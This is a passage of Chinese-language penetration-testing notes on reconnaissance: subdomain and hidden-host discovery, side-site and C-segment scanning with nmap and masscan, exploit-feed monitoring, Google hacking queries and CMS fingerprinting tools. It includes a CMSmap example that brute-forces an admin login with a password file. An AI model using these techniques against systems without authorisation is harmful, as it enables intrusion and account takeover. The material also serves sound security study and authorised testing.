data-url="aHR0cHM6Ly9zc2xtYXRlLmNvbS9jZXJ0c3BvdHRlci9hcGkv">https://sslmate.com/certspotter/api/</span></p></li><li><p>spyse：<span class="exturl" data-url="aHR0cHM6Ly9zcHlzZS5jb20vc2VhcmNoL2NlcnRpZmljYXRl">https://spyse.com/search/certificate</span></p></li><li><p>censys：<span class="exturl" data-url="aHR0cHM6Ly9jZW5zeXMuaW8vY2VydGlmaWNhdGVz">https://censys.io/certificates</span></p></li><li><p>google： <span class="exturl" data-url="aHR0cHM6Ly9nb29nbGUuY29tL3RyYW5zcGFyZW5jeXJlcG9ydC9odHRwcy9jdC8=">https://google.com/transparencyreport/https/ct/</span></p></li></ul><h3 id="用dns数据集收集子域"><a class="markdownIt-Anchor" href="#用dns数据集收集子域">#</a> 用 DNS 数据集收集子域</h3><p>原理：利用 DNS 记录公开数据收集 ；</p><p>注：将需要 {domain} 换成需要查询的域名，标红的是我认为效果较好；</p><ul><li><ul><li>ip138：<span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8lN0Jkb21haW4lN0QvZG9tYWluLmh0bQ==">https://site.ip138.com/{domain}/domain.htm</span></li><li domain="">百度云观测：<span class="exturl" data-url="aHR0cDovL2NlLmJhaWR1LmNvbS9pbmRleC9nZXRSZWxhdGVkU2l0ZXM/c2l0ZV9hZGRyZXNzPQ==">http://ce.baidu.com/index/getRelatedSites?site_address=</span></li></ul></li><li><ul><li>hackertarget：<span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=">https://hackertarget.com/find-dns-host-records/</span></li><li domain="">riddler：<span class="exturl" data-url="aHR0cHM6Ly9yaWRkbGVyLmlvL3NlYXJjaD9xPXBsZDo=">https://riddler.io/search?q=pld:</span></li></ul></li><li><ul><li domain="">dnsdb：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkYi5pby96aC1jbi9zZWFyY2g/cT0=">https://dnsdb.io/zh-cn/search?q=</span></li><li>ipv4info：<span class="exturl" data-url="aHR0cDovL2lwdjRpbmZvLmNvbS8=">http://ipv4info.com/</span></li></ul></li><li><ul><li>robtex：<span class="exturl" data-url="aHR0cHM6Ly93d3cucm9idGV4LmNvbS9kbnMtbG9va3VwLw==">https://www.robtex.com/dns-lookup/</span></li><li>chinaz：<span class="exturl" data-url="aHR0cHM6Ly9hbGV4YS5jaGluYXouY29tLw==">https://alexa.chinaz.com/</span></li></ul></li><li><ul><li>netcraft：<span class="exturl" data-url="aHR0cHM6Ly9zZWFyY2hkbnMubmV0Y3JhZnQuY29tLw==">https://searchdns.netcraft.com/</span></li><li>dnsdumpster：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v">https://dnsdumpster.com/</span></li></ul></li><li><ul><li>sitedossier：<span class="exturl" data-url="aHR0cDovL3d3dy5zaXRlZG9zc2llci5jb20v">http://www.sitedossier.com/</span></li><li>findsubdomains：<span class="exturl" data-url="aHR0cHM6Ly9maW5kc3ViZG9tYWlucy5jb20v">https://findsubdomains.com/</span></li></ul></li></ul><h3 id="利用威胁情报平台数据收集子域"><a class="markdownIt-Anchor" href="#利用威胁情报平台数据收集子域">#</a> 利用威胁情报平台数据收集子域</h3><p>都是需要注册的，注册免费查询；</p><ul><li><ul><li>AlienVault：<span class="exturl" data-url="aHR0cHM6Ly9vdHguYWxpZW52YXVsdC5jb20v">https://otx.alienvault.com/</span></li></ul></li><li><ul><li>RiskIQ 社区版：<span class="exturl" data-url="aHR0cHM6Ly9jb21tdW5pdHkucmlza2lxLmNvbS8=">https://community.riskiq.com/</span></li></ul></li><li><ul><li>微步在线：<span class="exturl" data-url="aHR0cHM6Ly94LnRocmVhdGJvb2suY24v">https://x.threatbook.cn/</span></li></ul></li><li><ul><li domain=""><span class="exturl" data-url="aHR0cDovL1RocmVhdE1pbmVyLm9yZw==">ThreatMiner.org</span>：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhyZWF0bWluZXIub3JnL2RvbWFpbi5waHA/cT0=">https://www.threatminer.org/domain.php?q=</span></li></ul></li><li><ul><li>VT：<span class="exturl" data-url="aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2RvbWFpbi8lN0Jkb21haW4lN0QvcmVsYXRpb25z">https://www.virustotal.com/gui/domain/{domain}/relations</span></li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL1BlbnRlc3QtVG9vbHMuY29t">Pentest-Tools.com</span>：<span class="exturl" data-url="aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9pbmZvcm1hdGlvbi1nYXRoZXJpbmcvZmluZC1zdWJkb21haW5zLW9mLWRvbWFpbiM=">https://pentest-tools.com/information-gathering/find-subdomains-of-domain#</span></li></ul></li></ul><h3 id="隐藏域名hosts碰撞"><a class="markdownIt-Anchor" href="#隐藏域名hosts碰撞">#</a> 隐藏域名 hosts 碰撞</h3><p>隐藏资产探测 - hosts 碰撞</p><p>很多时候访问目标资产 IP 响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止 IP 直接访问），因为这大多数都是需要绑定 host 才能正常请求访问的（目前互联网公司基本的做法）（域名删除了 A 记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的域名和目标资产的 IP 段组合起来，以 IP 段 + 域名的形式进行捆绑碰撞，就能发现很多有意思的东西；</p><p>脚本工具</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvZmFwcm8vSG9zdHNfc2Nhbg==">https://github.com/fofapro/Hosts_scan</span></p><p>原理：在发送 http 请求的时候，对域名和 IP 列表进行配对，然后遍历发送请求 （就相当于修改了本地的 hosts 文件一样），并把相应的 title 和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产；</p><p>使用：</p><p>进行 hosts 碰撞需要目标的域名和目标的相关 IP 作为字典；</p><p>相关 IP 来源有：</p><ol><li><ol><li>目标域名历史解析 IP<br><span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=">https://site.ip138.com/</span><br><span class="exturl" data-url="aHR0cHM6Ly9pcGNoYXh1bi5jb20v">https://ipchaxun.com/</span></li><li>页面 /js 源码爬取 IP<br>oneforall 貌似实现了<br>长亭的 rad 以 burp 为代理爬，保存返回包，再正则提取出 IP</li></ol></li></ol><p>具体可以参考：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZnVBU1pPRHcxckx2Z1Q3R3lTTUM4UQ==">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</span></p><h2 id="旁注c端"><a class="markdownIt-Anchor" href="#旁注c端">#</a> 旁注 / C 端</h2><h3 id="旁注"><a class="markdownIt-Anchor" href="#旁注">#</a> 旁注</h3><p>旁注攻击就是说在攻击目标时，对目标网站 “无法下手” 找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透，从而获取目标站点的权限，这过程就是旁注攻击；</p><p>IP 逆向查询：</p><ul><li><ul><li>yougetsignal：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91Z2V0c2lnbmFsLmNvbS90b29scy93ZWItc2l0ZXMtb24td2ViLXNlcnZlci8=">https://www.yougetsignal.com/tools/web-sites-on-web-server/</span></li><li>站长工具：<span class="exturl" data-url="aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWUv">http://s.tool.chinaz.com/same/</span></li></ul></li><li><ul><li>爱站：<span class="exturl" data-url="aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=">https://dns.aizhan.com/</span></li><li>同 ip 网站查询：<span class="exturl" data-url="aHR0cDovL2Rucy5idWdzY2FuZXIuY29tLw==">http://dns.bugscaner.com/</span></li></ul></li><li><ul><li>webscan：<span class="exturl" data-url="aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=">https://www.webscan.cc/</span></li></ul></li></ul><h3 id="c端"><a class="markdownIt-Anchor" href="#c端">#</a> C 端</h3><p>C 段指的是同一网段内的其他服务器，每个 IP 有 ABCD 四个段，举个例子，192.168.0.1，A 段就是 192，B 段是 168，C 段是 0，D 段是 1，而 C 段嗅探的意思就是拿下它同一 C 段中的其中一台服务器，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务器；</p><p>查询 C 段的方法很多，一下举例几种常见的：</p><ul><li><ul><li>在线 webscan：<span class="exturl" data-url="aHR0cHM6Ly93ZWJzY2FuLmNjLw==">https://webscan.cc/</span></li><li>fofa、shodan 在线工具：ip=“106.15.141.18/24”</li></ul></li><li><ul><li>nmap：nmap 192.168.1.0/24 -p 443,80</li><li>masscan：masscan 10.11.0.0/16 -p 443,80</li></ul></li><li><ul><li>goby</li><li>御剑 1.5</li></ul></li></ul><h3 id="旁注查询小脚本"><a class="markdownIt-Anchor" href="#旁注查询小脚本">#</a> 旁注查询小脚本</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9weS8yNjk5NzUwLzE2NDM2MDY1NjU3NzUtYTE0OTA4OGMtNGZiNC00ZjYxLWEwMmQtNTM2N2UxMzc4MzY1LnB5">📎旁站查询.py</span></p><h2 id="ip反查域名"><a class="markdownIt-Anchor" href="#ip反查域名">#</a> IP 反查域名</h2><p>原理：通过 ip 反查该 ip 绑定过的域名；</p><ul><li><ul><li>ip-adress：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaXAtYWRyZXNzLmNvbS9yZXZlcnNlLWlwLWxvb2t1cA==">https://www.ip-adress.com/reverse-ip-lookup</span></li><li>去查网：<span class="exturl" data-url="aHR0cDovL3d3dy43Yy5jb20v">http://www.7c.com/</span></li></ul></li><li><ul><li>IPIP：<span class="exturl" data-url="aHR0cHM6Ly90b29scy5pcGlwLm5ldC9pcGRvbWFpbi5waHA=">https://tools.ipip.net/ipdomain.php</span></li><li>Dynu：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZHludS5jb20vemgtQ04vTmV0d29ya1Rvb2xzL1JldmVyc2VMb29rdXA=">https://www.dynu.com/zh-CN/NetworkTools/ReverseLookup</span></li></ul></li><li><ul><li>yougetsignal：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91Z2V0c2lnbmFsLmNvbS90b29scy93ZWItc2l0ZXMtb24td2ViLXNlcnZlci8=">https://www.yougetsignal.com/tools/web-sites-on-web-server/</span></li></ul></li></ul><h2 id="查找厂商ip端"><a class="markdownIt-Anchor" href="#查找厂商ip端">#</a> 查找厂商 ip 端</h2><p><span class="exturl" data-url="aHR0cDovL2lwd2hvaXMuY25uaWMubmV0LmNuL2luZGV4LmpzcA==">http://ipwhois.cnnic.net.cn/index.jsp</span></p><h1 id="源码cms"><a class="markdownIt-Anchor" href="#源码cms">#</a> 源码 CMS</h1><h2 id="github监控"><a class="markdownIt-Anchor" href="#github监控">#</a> github 监控</h2><h3 id="exp监控"><a class="markdownIt-Anchor" href="#exp监控">#</a> exp 监控</h3><p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3loeTAvZ2l0aHViLWN2ZS1tb25pdG9y">https://github.com/yhy0/github-cve-monitor</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627370900489-a48b20f1-21eb-4e28-8f97-d1675c607d99.png" alt="img"></p><p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0p1c3RZb29tb29uL0NWRUFQ">https://github.com/JustYoomoon/CVEAP</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627377395097-efea1345-bb6e-4231-bdca-720b9221731f.png" alt="img"></p><h4 id="钉钉机器人举例"><a class="markdownIt-Anchor" href="#钉钉机器人举例">#</a> 钉钉机器人举例</h4><p>步骤一：在海外云主机上运行一下命令拉取项目文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JustYoomoon/CVEAP.git</span><br></pre></td></tr></table></figure><p>步骤二：进入项目文件进行配置（钉钉）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">##########修改处1########</span><br><span class="line"># 钉钉</span><br><span class="line">def dingding(text, msg):</span><br><span class="line">    # 将此处换为钉钉机器人的api</span><br><span class="line">    webhook = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span><br><span class="line">    ding = cb.DingtalkChatbot(webhook, secret=&quot;xxxxxxxxxxx&quot;)</span><br><span class="line">    ding.send_text(msg=&#x27;&#123;&#125;\r\n&#123;&#125;&#x27;.format(text, msg), is_at_all=False)</span><br><span class="line">##########修改处2######## </span><br><span class="line"> # 三选一即可，没配置的 注释或者删掉</span><br><span class="line"> # server(text, msg)</span><br><span class="line"> dingding(text, msg)</span><br><span class="line"> # tgbot(text,msg)</span><br><span class="line"> # print(msg)</span><br><span class="line"> # mail(text, msg)  </span><br></pre></td></tr></table></figure><p>步骤三：在钉钉中新建群并开启群机器人，将一下信息复制并填写到上面要修改的信息</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626826802670-84d1b326-3ebe-4d70-b04a-2dde4364a90d.png" alt="img"></p><p>步骤四：在服务器上安装上要安装的第三方库 <code>requests....</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">screen -S CVEAP </span><br><span class="line">python3 cveap.py</span><br><span class="line">ctrl+a ctrl+d</span><br></pre></td></tr></table></figure><p>步骤五：效果</p><p>运行脚本过一会才会收到推送</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627377779829-9c19feb2-1de8-40a5-9679-052c9c8b09dd.png" alt="img"></p><h2 id="引擎搜索"><a class="markdownIt-Anchor" href="#引擎搜索">#</a> 引擎搜索</h2><h3 id="白引擎"><a class="markdownIt-Anchor" href="#白引擎">#</a> 白引擎</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">百度：www.baidu.com</span><br><span class="line">bing：www.bing.com</span><br><span class="line">Yahoo：www.search.yahoo.com</span><br><span class="line">aol：www.search.aol.com</span><br><span class="line">google：google.cn</span><br></pre></td></tr></table></figure><h4 id="google-hack语法"><a class="markdownIt-Anchor" href="#google-hack语法">#</a> google hack 语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">intitle: 标题关键字</span><br><span class="line">inurl: URL关键特征</span><br><span class="line">intext: 内容关键词</span><br><span class="line">filetype: 指定类型文件  //例如：bak , mdb , asp , php , jsp</span><br><span class="line">site: 指定域名</span><br><span class="line">link: baidu.com  //表示返回所有和baidu.com做了链接的网站</span><br><span class="line">info: 查找指定站点的一些基本信息</span><br><span class="line">cache: 搜索google里关于某些内容的缓存</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">intext:管理</span><br><span class="line">    filetype:mdb</span><br><span class="line">    inurl:file</span><br><span class="line">    site:http://xx.com filetype:txt</span><br><span class="line">    site:http://xx.com filetype:asp</span><br><span class="line">    site:tw inurl:asp?id=    //查找台湾的</span><br><span class="line">    intitle:旁注- 网站 filetype:asp</span><br></pre></td></tr></table></figure><h3 id="黑暗引擎"><a class="markdownIt-Anchor" href="#黑暗引擎">#</a> 黑暗引擎</h3><p>引擎使用参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvYzk5NzQ5ZjctMWMxZC00YWVlLWE0ZTMtYTVmMTllMTlmMmYxPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpb2g4JUVGJUJDJTg5">https://www.yuque.com/docs/share/c99749f7-1c1d-4aee-a4e3-a5f19e19f2f1?#（密码：ioh8）</span> 《黑白引擎使用》</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www.shodan.io</span><br><span class="line"></span><br><span class="line">fofa.so</span><br><span class="line"></span><br><span class="line">www.zoomeye.org</span><br><span class="line"></span><br><span class="line">https://quake.360.cn/quake/#/index</span><br></pre></td></tr></table></figure><h2 id="cms识别"><a class="markdownIt-Anchor" href="#cms识别">#</a> CMS 识别</h2><p>1.CMS [内容管理系统]：快速搭建网站的模板；内容管理系统（content management system，CMS），是一种位于 WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。如：phpstudy</p><p>2.Web 应用框架：快速开放的 Web 应用框架，例如 MVC、MTV 等；</p><p>3. 指纹的特性：</p><p>1. 唯一性</p><p>2. 终身不变性</p><p>3. 方便性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">常见的CMS有：</span><br><span class="line">WordPress、</span><br><span class="line">    Dedecms、</span><br><span class="line">    Discuz、</span><br><span class="line">    PhpWeb、</span><br><span class="line">    PhpWind、</span><br><span class="line">    Dvbbs、</span><br><span class="line">    PhpCMS、</span><br><span class="line">    ECShop、</span><br><span class="line">    SiteWeaver、</span><br><span class="line">    AspCMS、</span><br><span class="line">    帝国、</span><br><span class="line">    Z-Blog、</span><br><span class="line">    等</span><br></pre></td></tr></table></figure><h3 id="开源cms在线识别"><a class="markdownIt-Anchor" href="#开源cms在线识别">#</a> 开源 CMS 在线识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">国外识别平台：https://whatcms.org/</span><br><span class="line"></span><br><span class="line">国内识别平台：</span><br><span class="line">bugscaner：http://whatweb.bugscaner.com/</span><br><span class="line"></span><br><span class="line">whatweb：https://www.whatweb.net/</span><br><span class="line">    </span><br><span class="line">    云悉：https://www.yunsee.cn/</span><br><span class="line">    </span><br><span class="line">    潮汐：http://finger.tidesec.net/</span><br><span class="line">    </span><br><span class="line">    TSscan:https://scan.dyboy.cn/web/</span><br><span class="line">    </span><br><span class="line">github直接找：</span><br><span class="line">https://github.com/search?q=cms识别</span><br></pre></td></tr></table></figure><h3 id="cms识别工具"><a class="markdownIt-Anchor" href="#cms识别工具">#</a> CMS 识别工具</h3><h4 id="cmsmap"><a class="markdownIt-Anchor" href="#cmsmap">#</a> CMSmap</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rpb25hY2gvQ01TbWFw">https://github.com/dionach/CMSmap</span></p><p><strong>安装</strong></p><p>github 克隆下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">  -f W/J/D, --force W/J/D</span><br><span class="line">  强制扫描 (W)ordpress、(J)oomla 或 (D)rupal</span><br><span class="line">  -F, --fullscan 使用大型插件列表进行全面扫描。误报和缓慢！</span><br><span class="line">  -t , --threads 线程数（默认 5）</span><br><span class="line">  -a , --agent 设置自定义用户代理</span><br><span class="line">  -H , --header 添加自定义标题（例如“授权：基本 ABCD...”）</span><br><span class="line">  -i , --input 扫描给定文件中列出的多个目标</span><br><span class="line">  -o , --output 将输出保存在文件中</span><br><span class="line">  -E, --noedb 枚举插件而不搜索漏洞</span><br><span class="line">  -c, --nocleanurls 仅对 Drupal 禁用干净的 url</span><br><span class="line">  -s, --nosslcheck 不验证服务器的证书</span><br><span class="line">  -d, --dictattack 在扫描期间运行低强度字典攻击（每个用户 5 次尝试）</span><br><span class="line">  -u , --usr 用户名或用户名文件</span><br><span class="line">  -p , --psw 密码或密码文件</span><br><span class="line">  -x, --noxmlrpc 在没有 XML-RPC 的情况下暴力破解 WordPress</span><br><span class="line">  </span><br><span class="line">使用实例：</span><br><span class="line">  cmsmap.py https://example.com</span><br><span class="line">  cmsmap.py https://example.com -f W -F --noedb -d </span><br><span class="line">  cmsmap.py https://example.com -i targets.txt -o output.txt</span><br><span class="line">  cmsmap.py https://example.com -u admin -p passwords.txt</span><br></pre></td></tr></table></figure><h4 id="ehole"><a class="markdownIt-Anchor" href="#ehole">#</a> EHole</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VkZ2VTZWN1cml0eVRlYW0vRUhvbGU=">https://github.com/EdgeSecurityTeam/EHole</span></p><p><strong>安装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哪个系统用就下载哪个</span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  参数：</span><br><span class="line">  -f 字符串</span><br><span class="line">        fofa搜索的资产，支持IP和IP段。（192.168.1.1 | 192.168.1.0/24）</span><br><span class="line">  -ftime 字符串</span><br><span class="line">        fofa 超时（默认“ 10 ”）</span><br><span class="line">  -h 这个帮助</span><br><span class="line">  -json 字符串</span><br><span class="line">        输出json</span><br><span class="line">  -l 字符串</span><br><span class="line">        基于本地文件的探测</span><br><span class="line">  -日志字符串</span><br><span class="line">        日志文件名（默认“ server.log ”）</span><br><span class="line">  -t 字符串</span><br><span class="line">        线程（默认“ 100 ”）</span><br><span class="line">        </span><br><span class="line">使用：</span><br><span class="line">本地识别：EHole -l url.txt //URL地址需带上协议，每行一个</span><br><span class="line">  FOFA识别：EHole -f 192.168.1.1/24 //支持单IP或IP段</span><br><span class="line">注意：从 FOFA 识别需要配置 FOFA 密码以及邮箱，在 config.ini 内配置好密码以及邮箱使用。</span><br><span class="line">  结果输出：EHole -l url.txt -json export.json //结果输出至export.json文件</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627438927073-c19f47a6-8895-45aa-bc2b-31ae76202602.png" alt="img"></p><h4 id="cmseek"><a class="markdownIt-Anchor" href="#cmseek">#</a> CMSeeK</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1R1aGluc2h1YmhyYS9DTVNlZUs=">https://github.com/Tuhinshubhra/CMSeeK</span></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Tuhinshubhra/CMSeeK.git</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">python3 cmseek.py</span><br><span class="line"></span><br><span class="line">如果提示没有安装，选择y，进行安装</span><br><span class="line"></span><br><span class="line">选择1，进行cms基本检测，结果会自动保存</span><br><span class="line"></span><br><span class="line">选择2，多个域名扫描，用“,”隔开</span><br><span class="line"></span><br><span class="line">结果会保存在/Result/&#123;域名&#125;/*.json文件内</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">  python3 cmseek.py -u example.com          </span><br><span class="line">      # 直接扫描</span><br><span class="line">          </span><br><span class="line">      python3 cmseek.py -l /home/user/target.txt    </span><br><span class="line">      #扫描target.txt中指定的站点（逗号分隔） </span><br><span class="line">      </span><br><span class="line">      python3 cmseek.py -u example.com --user-agent Mozilla 5.0  </span><br><span class="line">      #使用自定义user-Agent扫描example.com这里使用的是Mozilla 5.0</span><br><span class="line">          </span><br><span class="line">      python3 cmseek.py -u example.com --random-agent            </span><br><span class="line">      # 使用随机用户代理扫描 example.com</span><br><span class="line">      </span><br><span class="line">      python3 cmseek.py -v -u example.com                        </span><br><span class="line">      # 在扫描 example.com 时启用详细输出</span><br></pre></td></tr></table></figure><h4 id="whatcms"><a class="markdownIt-Anchor" href="#whatcms">#</a> whatcms</h4><p>kali 自带</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628065865633-17b42e51-59bc-4aff-a352-a235abfffca2.png" alt="img"></p><h3 id="chrome插件"><a class="markdownIt-Anchor" href="#chrome插件">#</a> chrome 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wappalyzer：https://www.wappalyzer.com</span><br><span class="line">whatruns：https://www.whatruns.com/</span><br></pre></td></tr></table></figure><h3 id="人工识别"><a class="markdownIt-Anchor" href="#人工识别">#</a> 人工识别</h3><ul><li>引擎 &amp; 前端源码配合识别</li><li>显示页面 &amp; 框架不同来判断</li></ul><p>识别目标：</p><ul><li><ul><li>开发语言</li><li>开发框架</li></ul></li><li><ul><li>第三方组件</li><li>CMS 程序</li></ul></li><li><ul><li>数据库</li></ul></li></ul><p>开发语言：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">后缀名识别：asp,php,jsp</span><br><span class="line"></span><br><span class="line">如果无法通过后缀名识别，可以通过抓包查看与后台的交互点，如：登录，查询</span><br><span class="line"></span><br><span class="line">http返回消息头：x-Powered-By</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID--&gt;php  ,   JSPSESSID--&gt;jsp  ,   ASPSESSID--&gt;asp</span><br></pre></td></tr></table></figure><p>开发框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php的Thinkphp框架识别方法特定的ico：https://www.thinkphp.cn/</span><br><span class="line"></span><br><span class="line">Action后缀 90%机率是struts2或者webwork</span><br><span class="line"></span><br><span class="line">do后缀 50%机率是spring mvc</span><br><span class="line"></span><br><span class="line">url路径 /action/xxx 70%机率是struts2</span><br><span class="line"></span><br><span class="line">form后缀 60%机率是spring mvc</span><br><span class="line"></span><br><span class="line">Vm后缀 90%机率是VelocityViewServlet</span><br><span class="line"></span><br><span class="line">jsf后缀 99%机率是java server faces</span><br><span class="line"></span><br><span class="line">http返回消息头：X-Generator: Swiftlet    很多时候没有显示</span><br></pre></td></tr></table></figure><p>第三方组件：</p><figure 